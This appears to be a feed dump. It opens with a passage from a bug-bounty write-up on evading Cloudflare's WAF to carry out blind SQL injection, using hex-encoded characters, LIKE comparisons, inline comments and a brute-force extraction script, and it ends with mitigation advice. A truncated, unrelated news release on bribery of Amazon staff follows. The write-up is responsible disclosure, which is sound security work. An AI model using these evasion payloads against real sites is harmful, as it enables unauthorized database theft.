&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c3&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t1&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;X&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MARK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;The technique typically used for this kind of injection is a Time-based Blind SQL injection. The problem was, that Cloudflare would recognize these kinds of injections and block them on the spot. No matter how complicated I tried to make the query or how many sqlmap tamper scripts I used, Cloudflare was always there.&lt;/p&gt;
&lt;p&gt;To overcome this issue, I used an observation I made while manually testing for SQL injections on the same request: I had noticed that when I tried to inject code that resulted in something close to the following SQL query:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c3&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t1&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'a'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'a'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;the web server responded with status 200 OK. When I tried to inject code that resulted in something close to this SQL query:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c3&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t1&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'a'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'b'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;the server responded with status 500 Internal Server Error.&lt;/p&gt;
&lt;p&gt;In other words when the SQL query in the backend did NOT return results, the web server complained and crashed (probably because the backend code tried to access an item in the returned list whose index was out of range). This gave me an idea: writing a script that compared a character picked from the name of the required DBMS entity and sequentially compared it with all characters. The idea was, if the two characters matched, the server would return a 200 OK status, else it would return a 500 Internal Server Error status and I would have to compare the requested character with the next character in my list.&lt;/p&gt;
&lt;h4 id=&quot;first-try&quot;&gt;First Try&lt;/h4&gt;
&lt;p&gt;My thinking was that if a wanted to find the first second character of the name of the fifth table (as they are listed in information_schema.tables), I would start by asking MySQL if that character is equal to ‘a’ and if not I would continue with ‘b’, ‘c’ etc. I would start by inject the following string (for comparison with ‘a’):&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;s1&quot;&gt;'a'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SUBSTRING&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;table_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information_schema&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tables&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;LIMIT&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;which would result in the following SQL query to be executed on the server:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c3&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t1&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'a'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SUBSTRING&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;table_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information_schema&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tables&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;LIMIT&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;When I found the table name to be t1 for example, I was to brute force its columns’ names with the following starting injection:&lt;/p&gt;
&lt;p&gt;&lt;em&gt;INJECTION 1&lt;/em&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;s1&quot;&gt;'a'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SUBSTRING&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;column_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information_schema&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;columns&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;table_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;&quot;t1&quot;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;LIMIT&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;and then actually get values out of column c1 of table t1 by starting with the following injection:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;s1&quot;&gt;'a'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SUBSTRING&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t1&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;LIMIT&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;The idea was good, but Cloudflare would complain about the ‘=’ sign. The injection&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;s1&quot;&gt;'a'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'b'&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;would get blocked by Cloudflare’s WAF. After a bit of fiddling, I came up with the following request that bypassed the ‘=’ restriction:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;s1&quot;&gt;'a'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;LIKE&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'b'&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;This means that the initial injection &lt;em&gt;INJECTION 1&lt;/em&gt; would become:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;s1&quot;&gt;'a'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;LIKE&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SUBSTRING&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;column_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information_schema&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;columns&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;table_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;&quot;t1&quot;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;LIMIT&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;second-try&quot;&gt;Second Try&lt;/h4&gt;
&lt;p&gt;&lt;em&gt;INJECTION 1&lt;/em&gt; was still not ready to go. Cloudflare would still complain about stuff. More specifically the injection&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;s1&quot;&gt;'a'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;LIKE&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'b'&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;would still get blocked, not because of the LIKE keyword, but because of the ‘a’ character. Comparing plain strings to anything was not allowed. To overcome this issue I came up with the following injection that went through undetected by the WAF:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;s1&quot;&gt;'0x61'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;LIKE&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'b'&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;The above injection sends the character ‘a’ as the hex-encoded value ‘0x61’ which still allows it to work:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;s1&quot;&gt;'0x61'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;LIKE&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'a'&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;still returns True, and&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;s1&quot;&gt;'0x61'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;LIKE&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'b'&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;passes through undetected and returns False.&lt;/p&gt;
&lt;p&gt;The resulting &lt;em&gt;INJECTION 1&lt;/em&gt; now looks like this:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;s1&quot;&gt;'0x61'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;LIKE&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SUBSTRING&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;column_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information_schema&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;columns&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;table_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;&quot;t1&quot;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;LIMIT&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;third-try&quot;&gt;Third Try&lt;/h4&gt;
&lt;p&gt;The third obfuscation I had to enroll was a multi-line comment addition between SQL query keywords. Cloudflare would block queries like this:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c3&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t1&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'0x61'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;LIKE&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'b'&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;but with a multi-line comment trick, the new query would go through undetected:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/*trick comment*/&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c3&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/*trick comment*/&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t1&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'0x61'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;LIKE&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'b'&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Thus, applying this method on &lt;em&gt;INJECTION 1&lt;/em&gt;, would make it look like this:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;s1&quot;&gt;'0x61'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;LIKE&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/*trick comment*/&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SUBSTRING&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;column_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/*trick comment*/&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information_schema&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;columns&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;table_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;&quot;t1&quot;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;LIMIT&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;The above injection is in its final form and when passed as a form value to the vulnerable web application the web server will reply with a 200 OK if the character ‘a’ matches the first character of the first column’s name of table t1.&lt;/p&gt;
&lt;h4 id=&quot;full-speed-ahead&quot;&gt;Full Speed Ahead&lt;/h4&gt;
&lt;p&gt;To make the retrieving of table contents from the application’s database easier I wrote a script in Python to automate the process. The pseudocode of the script goes something like this:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# assert names of columns and table name is known
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;alphabet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,...,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;characterPosition&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# the position of the character we are bruteforcing
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rowNumber&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;columnName&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;columns&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;

      &lt;span class=&quot;n&quot;&gt;sqlInjection&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'''
        0x{hex_encode(character)} LIKE (
        SELECT/*trick comment*/ SUBSTRING({columnName}, characterPosition,1)

        &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;next&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;character&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;alphabet&lt;/span&gt;

      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;And this is how I bypassed Cloudflare WAF’s SQL injection protection. I got a free t-shirt and a place in &lt;a href=&quot;https://hackerone.com/gskourou&quot;&gt;Cloudflare’s HoF&lt;/a&gt;.&lt;/p&gt;
&lt;h4 id=&quot;mitigation&quot;&gt;Mitigation&lt;/h4&gt;
&lt;p&gt;Cloudlfare reviewed and fixed the vulnerability a few days after my report.&lt;/p&gt;
&lt;p&gt;The safest way to mitigate SQL injections on your databases is prepared statements. These come in most database interaction libraries for most languages. You can find a full list of ways to mitigate SQL injections at &lt;a href=&quot;https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html&quot;&gt;OWASP&lt;/a&gt;. It is my opinion that if developers take good care to apply security measures on their applications, WAFs are most of the times unnecessary. All you need to do is sanitize the users’ input properly.&lt;/p&gt;

<title>Six indicted in multimillion dollar scheme to bribe Amazon staff</title>

<description>&lt;p&gt;Seattle - Six people have been indicted by a Grand Jury in the Western District of Washington with conspiring to pay over $100,000 in commercial bribes to Amazon employees and contractors, in exchange for an unfair competitive advantage on the Amazon Marketplace, announced U.S. Attorney Brian T. Moran.  EPHRAIM ROSENBERG, 45, of Brooklyn, New York; JOSEPH NILSEN, 31, and KRISTEN LECCESE, 32, of New York, New York; HADIS NUHANOVIC, 30, of Acworth, Georgia; ROHIT KADIMISETTY, 27, of Northridge, California; and NISHAD KUNJU, 31, of Hyderabad, India, are charged with conspiracy to use a communication facility to commit commercial bribery, conspiracy to access a protected computer without authorization, conspiracy to commit wire fraud, and wire fraud.  The defendants will make their initial appearances in U.S. District Court in Seattle on October 15, 2020.&lt;/p&gt;
&lt;p&gt;“As the world moves increasingly to online commerce, we must ensure that the marketplace is not corrupted with unfair advantages obtained by bribes and kick‑backs,” said U.S. Attorney Brian T. Moran.  “The ultimate victim from this criminal conduct is the buying public who get inferior or even dangerous goods that should have been removed from the marketplace.  I commend the investigators and cybersecurity experts who have worked to identify and indict those engaged in these illegal schemes.”&lt;/p&gt;
&lt;p&gt;“Realizing they could not compete on a level playing field, the subjects turned to bribery and fraud in order to gain the upper hand.  What's equally concerning, not only did they attempt to increase sales of their own products, but sought to damage and discredit their competitors,” said Raymond Duda, Special agent in charge, FBI Seattle.  “This indictment should send a message that the FBI will not sit on the sidelines while criminals try to cheat their way to the top.”&lt;/p&gt;
&lt;p&gt;According to the Indictment, since at least 2017, the defendants have used bribery and fraud to benefit merchant accounts on the Amazon Marketplace, resulting in more than $100 million of competitive benefits to those accounts, harm to competitors, and harm to consumers.  More specifically, the Indictment alleges that the defendants served as consultants to so-called third-party (“3P”) sellers on the Amazon Marketplace.  Those 3P sellers consisted of individuals and entities who sold a wide range of goods, including household goods, consumer electronics, and dietary supplements on Amazon’s multi-billion-dollar electronic commerce platform.  In addition to providing consulting services to these 3P sellers, some of the defendants, including NILSEN, LECCESE, and NUHANOVIC, made their own sales on the Amazon Marketplace through 3P accounts they operated. &lt;/p&gt;
&lt;p&gt;In the course of the conspiracy described in the Indictment, the defendants paid bribes to at least ten different Amazon employees and contractors, including KUNJU, who accepted bribes as a seller-support associate in Hyderabad, India, before becoming an outside consultant who recruited and paid bribes to his former colleagues.  In exchange for those bribes, the corrupted employees and contractors took the following illicit steps:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Reinstating suspended merchant accounts and product listings on the Amazon Marketplace&lt;/strong&gt;:  The corrupted employees and contractors helped reinstate products and merchant accounts that Amazon had suspended or blocked entirely from doing business on the Amazon Marketplace.  The fraudulently reinstated products included dietary supplements that had been suspended because of customer-safety complaints, household electronics that had been flagged as flammable, consumer goods that had been flagged for intellectual-property violations, and other goods.  The fraudulently reinstated accounts included accounts that Amazon had suspended for manipulating product reviews to deceive consumers, making improper contact with consumers, and other violations of Amazon’s seller policies and codes of conduct.  The Indictment describes a variety of ways in which corrupted employees and contractors misused their positions to reinstate these accounts, including by manually reinstating product listings, and approving baseless 